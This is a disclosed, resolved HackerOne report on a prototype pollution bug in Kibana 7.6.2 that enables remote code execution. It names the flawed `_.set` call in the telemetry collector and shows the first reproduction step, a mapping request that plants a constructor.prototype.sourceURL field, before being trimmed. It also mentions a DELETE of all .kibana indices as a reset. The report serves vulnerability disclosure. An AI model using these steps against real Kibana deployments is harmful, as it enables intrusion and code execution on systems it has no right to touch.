# [C] Remote Code Execution on Cloud via latest Kibana 7.6.2

## Summary
Severity: Critical
Program: Elastic
Weakness: Privilege Escalation
Reporter: alexbrasetvik
State: resolved
Disclosed: 2020-07-28T19:45:35.016Z
Source: https://hackerone.com/reports/852613

## Details
**Summary:** A prototype pollution in Kibana can be used to gain remote code execution.

**Description:**

There is a prototype pollution bug in the upgrade assistant's telemetry collector, via a dangerous usage of `_.set`: https://github.com/elastic/kibana/blob/master/x-pack/plugins/upgrade_assistant/server/lib/telemetry/usage_collector.ts#L93

We can pollute the prototype by providing a specially crafted "upgrade-assistant-telemetry" "saved object".

The attached video provides a walkthrough. There is a bit of waiting involved at one point, I included the entire thing for completeness with a hint of when you can fast forward :) 

## Steps To Reproduce:

The following assumes an otherwise empty Kibana. If any steps breaks Kibana, you can `DELETE /.kibana*` and restart it to get going again.

  1. Update the kibana mappings so we can provide our "upgrade-assistant-telemetry" document. It's important to provide the full mapping and not just do a dynamic one, or Kibana can refuse to start up due to err-ing when validating mappings

```
PUT /.kibana_1/_mappings
{
  "properties": {
    "upgrade-assistant-telemetry": {
      "properties": {
        "constructor": {
          "properties": {
            "prototype": {
              "properties": {
                "sourceURL": {
                  "type": "text",
                  "fields": {
                    "keyword": {
                      "type": "keyword",
                      "ignore_above": 256
                    }
                  }
                }
              }
            }
          }
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/852613_
